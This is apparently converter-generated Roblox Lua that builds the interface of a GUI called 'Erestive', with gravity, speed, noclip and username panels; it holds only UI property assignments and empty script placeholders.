G2L["18f"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["18f"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["18f"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["18f"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.UICorner
G2L["190"] = Instance.new("UICorner", G2L["18f"]);
G2L["190"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.FOVSet
G2L["191"] = Instance.new("TextBox", G2L["18f"]);
G2L["191"]["Name"] = [[FOVSet]];
G2L["191"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["191"]["TextWrapped"] = true;
G2L["191"]["TextSize"] = 14;
G2L["191"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["TextScaled"] = true;
G2L["191"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["191"]["ClearTextOnFocus"] = false;
G2L["191"]["PlaceholderText"] = [[196.2]];
G2L["191"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["191"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["191"]["Text"] = [[196.2]];
G2L["191"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV
G2L["192"] = Instance.new("Frame", G2L["18f"]);
G2L["192"]["ZIndex"] = 2;
G2L["192"]["BorderSizePixel"] = 0;
G2L["192"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["192"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
G2L["192"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["192"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["192"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Animations
G2L["193"] = Instance.new("LocalScript", G2L["192"]);
G2L["193"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["194"] = Instance.new("ImageLabel", G2L["193"]);
G2L["194"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["194"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["194"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["194"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["194"]["BackgroundTransparency"] = 1;
G2L["194"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.UICorner
G2L["195"] = Instance.new("UICorner", G2L["192"]);
G2L["195"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Button
G2L["196"] = Instance.new("TextButton", G2L["192"]);
G2L["196"]["TextWrapped"] = true;
G2L["196"]["TextSize"] = 14;
G2L["196"]["TextScaled"] = true;
G2L["196"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["196"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["196"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["196"]["BackgroundTransparency"] = 1;
G2L["196"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["196"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["196"]["Text"] = [[ ]];
G2L["196"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["197"] = Instance.new("LocalScript", G2L["196"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Button.Animations
G2L["198"] = Instance.new("LocalScript", G2L["196"]);
G2L["198"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.Text
G2L["199"] = Instance.new("TextLabel", G2L["192"]);
G2L["199"]["TextWrapped"] = true;
G2L["199"]["ZIndex"] = 9;
G2L["199"]["TextSize"] = 14;
G2L["199"]["TextScaled"] = true;
G2L["199"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["199"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["199"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["199"]["BackgroundTransparency"] = 1;
G2L["199"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["199"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["199"]["Text"] = [[Set Gravity]];
G2L["199"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.FOVConfig.SetFOV.UIGradient
G2L["19a"] = Instance.new("UIGradient", G2L["192"]);
G2L["19a"]["Rotation"] = -90;
G2L["19a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Gravity.FOV.UIGradient
G2L["19b"] = Instance.new("UIGradient", G2L["18a"]);
G2L["19b"]["Rotation"] = -90;
G2L["19b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2
G2L["19c"] = Instance.new("ScrollingFrame", G2L["a6"]);
G2L["19c"]["Visible"] = false;
G2L["19c"]["Active"] = true;
G2L["19c"]["ZIndex"] = 3;
G2L["19c"]["BorderSizePixel"] = 0;
G2L["19c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19c"]["Name"] = [[Frame2]];
G2L["19c"]["ScrollBarImageTransparency"] = 1;
G2L["19c"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["19c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["19c"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19c"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["19c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19c"]["ScrollBarThickness"] = 0;
G2L["19c"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.UIPadding
G2L["19d"] = Instance.new("UIPadding", G2L["19c"]);
G2L["19d"]["PaddingTop"] = UDim.new(0, 5);
G2L["19d"]["PaddingRight"] = UDim.new(0, 5);
G2L["19d"]["PaddingLeft"] = UDim.new(0, 5);
G2L["19d"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.UIGridLayout
G2L["19e"] = Instance.new("UIGridLayout", G2L["19c"]);
G2L["19e"]["CellSize"] = UDim2.new(0, 170, 0, 40);
G2L["19e"]["CellPadding"] = UDim2.new(0, 15, 0, 20);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z
G2L["19f"] = Instance.new("Frame", G2L["19c"]);
G2L["19f"]["BorderSizePixel"] = 0;
G2L["19f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19f"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["19f"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["19f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19f"]["Name"] = [[z]];
G2L["19f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.UIListLayout
G2L["1a0"] = Instance.new("UIListLayout", G2L["19f"]);
G2L["1a0"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV
G2L["1a1"] = Instance.new("Frame", G2L["19f"]);
G2L["1a1"]["BorderSizePixel"] = 0;
G2L["1a1"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1a1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1a1"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["1a1"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.WhiteBar
G2L["1a2"] = Instance.new("Frame", G2L["1a1"]);
G2L["1a2"]["BorderSizePixel"] = 0;
G2L["1a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a2"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["1a2"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["1a2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1a2"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.WhiteBar.UIGradient
G2L["1a3"] = Instance.new("UIGradient", G2L["1a2"]);
G2L["1a3"]["Rotation"] = 90;
G2L["1a3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.UICorner
G2L["1a4"] = Instance.new("UICorner", G2L["1a1"]);
G2L["1a4"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig
G2L["1a5"] = Instance.new("Frame", G2L["1a1"]);
G2L["1a5"]["BorderSizePixel"] = 0;
G2L["1a5"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1a5"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["1a5"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["1a5"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.UICorner
G2L["1a6"] = Instance.new("UICorner", G2L["1a5"]);
G2L["1a6"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet1
G2L["1a7"] = Instance.new("Frame", G2L["1a5"]);
G2L["1a7"]["ZIndex"] = 6;
G2L["1a7"]["BorderSizePixel"] = 0;
G2L["1a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a7"]["Size"] = UDim2.new(0.015, 0, 1, 0);
G2L["1a7"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["1a7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1a7"]["Name"] = [[FOVSet1]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet1.UIGradient
G2L["1a8"] = Instance.new("UIGradient", G2L["1a7"]);
G2L["1a8"]["Rotation"] = 90;
G2L["1a8"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.UIListLayout
G2L["1a9"] = Instance.new("UIListLayout", G2L["1a5"]);
G2L["1a9"]["Padding"] = UDim.new(0, 10);
G2L["1a9"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet
G2L["1aa"] = Instance.new("TextBox", G2L["1a5"]);
G2L["1aa"]["Name"] = [[FOVSet]];
G2L["1aa"]["PlaceholderColor3"] = Color3.fromRGB(90, 169, 157);
G2L["1aa"]["TextWrapped"] = true;
G2L["1aa"]["TextSize"] = 14;
G2L["1aa"]["TextColor3"] = Color3.fromRGB(71, 255, 38);
G2L["1aa"]["TextScaled"] = true;
G2L["1aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["1aa"]["ClearTextOnFocus"] = false;
G2L["1aa"]["PlaceholderText"] = [[UserName]];
G2L["1aa"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["1aa"]["Position"] = UDim2.new(0.54158, 0, 0, 0);
G2L["1aa"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1aa"]["Text"] = [[Name]];
G2L["1aa"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet2
G2L["1ab"] = Instance.new("TextButton", G2L["1a5"]);
G2L["1ab"]["TextWrapped"] = true;
G2L["1ab"]["BorderSizePixel"] = 0;
G2L["1ab"]["TextSize"] = 14;
G2L["1ab"]["TextScaled"] = true;
G2L["1ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ab"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ab"]["BackgroundTransparency"] = 1;
G2L["1ab"]["Size"] = UDim2.new(0, 11, 0, 33);
G2L["1ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ab"]["Text"] = [[Y]];
G2L["1ab"]["Name"] = [[FOVSet2]];
G2L["1ab"]["Position"] = UDim2.new(0.61299, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet2.LocalScript
G2L["1ac"] = Instance.new("LocalScript", G2L["1ab"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet3
G2L["1ad"] = Instance.new("TextButton", G2L["1a5"]);
G2L["1ad"]["TextWrapped"] = true;
G2L["1ad"]["BorderSizePixel"] = 0;
G2L["1ad"]["TextSize"] = 14;
G2L["1ad"]["TextScaled"] = true;
G2L["1ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ad"]["BackgroundTransparency"] = 1;
G2L["1ad"]["Size"] = UDim2.new(0, 11, 0, 33);
G2L["1ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ad"]["Text"] = [[N]];
G2L["1ad"]["Name"] = [[FOVSet3]];
G2L["1ad"]["Position"] = UDim2.new(0.61299, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.FOVSet3.LocalScript
G2L["1ae"] = Instance.new("LocalScript", G2L["1ad"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.FOVConfig.NeverGuis
G2L["1af"] = Instance.new("Highlight", G2L["1a5"]);
G2L["1af"]["Name"] = [[NeverGuis]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.UIGradient
G2L["1b0"] = Instance.new("UIGradient", G2L["1a1"]);
G2L["1b0"]["Rotation"] = -90;
G2L["1b0"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.z.FOV.ImageLabel
G2L["1b1"] = Instance.new("ImageLabel", G2L["1a1"]);
G2L["1b1"]["BorderSizePixel"] = 0;
G2L["1b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1b1"]["Image"] = [[rbxassetid://120129574453255]];
G2L["1b1"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["1b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b1"]["BackgroundTransparency"] = 1;
G2L["1b1"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip
G2L["1b2"] = Instance.new("Frame", G2L["19c"]);
G2L["1b2"]["BorderSizePixel"] = 0;
G2L["1b2"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1b2"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["1b2"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["1b2"]["Name"] = [[noclip]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.WhiteBar
G2L["1b3"] = Instance.new("Frame", G2L["1b2"]);
G2L["1b3"]["BorderSizePixel"] = 0;
G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b3"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["1b3"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["1b3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1b3"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.WhiteBar.UIGradient
G2L["1b4"] = Instance.new("UIGradient", G2L["1b3"]);
G2L["1b4"]["Rotation"] = 90;
G2L["1b4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider
G2L["1b5"] = Instance.new("Frame", G2L["1b2"]);
G2L["1b5"]["ZIndex"] = 999;
G2L["1b5"]["BorderSizePixel"] = 0;
G2L["1b5"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1b5"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["1b5"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["1b5"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Animations
G2L["1b6"] = Instance.new("LocalScript", G2L["1b5"]);
G2L["1b6"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Animations.Sample
G2L["1b7"] = Instance.new("ImageLabel", G2L["1b6"]);
G2L["1b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b7"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1b7"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["1b7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1b7"]["BackgroundTransparency"] = 1;
G2L["1b7"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.UICorner
G2L["1b8"] = Instance.new("UICorner", G2L["1b5"]);
G2L["1b8"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Button
G2L["1b9"] = Instance.new("TextButton", G2L["1b5"]);
G2L["1b9"]["TextSize"] = 14;
G2L["1b9"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["1b9"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["1b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b9"]["ZIndex"] = 2;
G2L["1b9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1b9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1b9"]["Text"] = [[ ]];
G2L["1b9"]["Name"] = [[Button]];
G2L["1b9"]["Visible"] = false;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Button.LocalScript
G2L["1ba"] = Instance.new("LocalScript", G2L["1b9"]);
G2L["1ba"]["Enabled"] = false;
G2L["1ba"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Button.LocalScript
G2L["1bb"] = Instance.new("LocalScript", G2L["1b9"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Button.UICorner
G2L["1bc"] = Instance.new("UICorner", G2L["1b9"]);
G2L["1bc"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.UIGradient
G2L["1bd"] = Instance.new("UIGradient", G2L["1b5"]);
G2L["1bd"]["Rotation"] = -90;
G2L["1bd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.Slider.Locked
G2L["1be"] = Instance.new("ImageLabel", G2L["1b5"]);
G2L["1be"]["ZIndex"] = 999999;
G2L["1be"]["BorderSizePixel"] = 0;
G2L["1be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1be"]["Image"] = [[rbxassetid://17783082088]];
G2L["1be"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1be"]["BackgroundTransparency"] = 1;
G2L["1be"]["Name"] = [[Locked]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.OnOrOff
G2L["1bf"] = Instance.new("TextLabel", G2L["1b2"]);
G2L["1bf"]["TextWrapped"] = true;
G2L["1bf"]["ZIndex"] = 2;
G2L["1bf"]["TextSize"] = 14;
G2L["1bf"]["TextScaled"] = true;
G2L["1bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1bf"]["BackgroundTransparency"] = 1;
G2L["1bf"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["1bf"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1bf"]["Text"] = [[Off]];
G2L["1bf"]["Name"] = [[OnOrOff]];
G2L["1bf"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.UICorner
G2L["1c0"] = Instance.new("UICorner", G2L["1b2"]);
G2L["1c0"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.UIGradient
G2L["1c1"] = Instance.new("UIGradient", G2L["1b2"]);
G2L["1c1"]["Rotation"] = -90;
G2L["1c1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.noclip.ImageLabel
G2L["1c2"] = Instance.new("ImageLabel", G2L["1b2"]);
G2L["1c2"]["BorderSizePixel"] = 0;
G2L["1c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1c2"]["Image"] = [[rbxassetid://104125678695957]];
G2L["1c2"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["1c2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c2"]["BackgroundTransparency"] = 1;
G2L["1c2"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed
G2L["1c3"] = Instance.new("Frame", G2L["19c"]);
G2L["1c3"]["BorderSizePixel"] = 0;
G2L["1c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c3"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["1c3"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["1c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c3"]["Name"] = [[Speed]];
G2L["1c3"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.UIListLayout
G2L["1c4"] = Instance.new("UIListLayout", G2L["1c3"]);
G2L["1c4"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV
G2L["1c5"] = Instance.new("Frame", G2L["1c3"]);
G2L["1c5"]["BorderSizePixel"] = 0;
G2L["1c5"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1c5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1c5"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["1c5"]["Name"] = [[FOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.WhiteBar
G2L["1c6"] = Instance.new("Frame", G2L["1c5"]);
G2L["1c6"]["BorderSizePixel"] = 0;
G2L["1c6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c6"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["1c6"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["1c6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1c6"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.WhiteBar.UIGradient
G2L["1c7"] = Instance.new("UIGradient", G2L["1c6"]);
G2L["1c7"]["Rotation"] = 90;
G2L["1c7"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.UICorner
G2L["1c8"] = Instance.new("UICorner", G2L["1c5"]);
G2L["1c8"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig
G2L["1c9"] = Instance.new("Frame", G2L["1c5"]);
G2L["1c9"]["BorderSizePixel"] = 0;
G2L["1c9"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1c9"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["1c9"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["1c9"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.UICorner
G2L["1ca"] = Instance.new("UICorner", G2L["1c9"]);
G2L["1ca"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.FOVSet
G2L["1cb"] = Instance.new("TextBox", G2L["1c9"]);
G2L["1cb"]["Name"] = [[FOVSet]];
G2L["1cb"]["PlaceholderColor3"] = Color3.fromRGB(90, 169, 157);
G2L["1cb"]["TextWrapped"] = true;
G2L["1cb"]["TextSize"] = 14;
G2L["1cb"]["TextColor3"] = Color3.fromRGB(71, 255, 38);
G2L["1cb"]["TextScaled"] = true;
G2L["1cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["1cb"]["ClearTextOnFocus"] = false;
G2L["1cb"]["PlaceholderText"] = [[16 - classic]];
G2L["1cb"]["Size"] = UDim2.new(0, 86, 0, 33);
G2L["1cb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1cb"]["Text"] = [[36]];
G2L["1cb"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.FOVSet.LocalScript
G2L["1cc"] = Instance.new("LocalScript", G2L["1cb"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV
G2L["1cd"] = Instance.new("Frame", G2L["1c9"]);
G2L["1cd"]["Visible"] = false;
G2L["1cd"]["ZIndex"] = 2;
G2L["1cd"]["BorderSizePixel"] = 0;
G2L["1cd"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["1cd"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
